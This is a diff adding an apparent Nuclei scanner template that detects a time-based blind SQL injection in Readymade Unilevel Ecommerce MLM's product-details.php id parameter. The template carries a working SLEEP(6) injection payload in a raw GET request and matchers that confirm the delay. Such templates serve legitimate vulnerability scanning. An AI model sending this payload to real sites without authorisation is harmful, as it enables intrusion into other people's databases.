@@ -1,0 +1,32 @@
+http:
+- matchers:
+  - condition: and
+    dsl:
+    - duration>=6
+    - status_code == 200
+    - contains(content_type,"text/html")
+    - contains_all(body, "user_login_id", "Products</a>")
+    type: dsl
+  raw:
+  - '@timeout 30s
+
+    GET /product-details.php?id=1%20AND%20(SELECT%206812%20FROM%20(SELECT(SLEEP(6)))DddL)
+    HTTP/1.1
+
+    Host: {{Hostname}}
+
+    '
+id: readymade-unilevel-sqli
+info:
+  author: s4e-io
+  description: 'Readymade Unilevel Ecommerce software has sql vulnerability in product-details.php?id
+
+    '
+  metadata:
+    product: readymade-unilevel-ecommerce
+    vendor: i-netsolution
+  name: Readymade Unilevel Ecommerce MLM - SQL Injection
+  reference:
+  - https://packetstormsecurity.com/files/179886/ReadyMade-Unilevel-Ecommerce-MLM-Blind-SQL-Injection-Cross-Site-Scripting.html
+  severity: high
+  tags: time-based-sqli,ecommerce,readymade,sqli,vuln
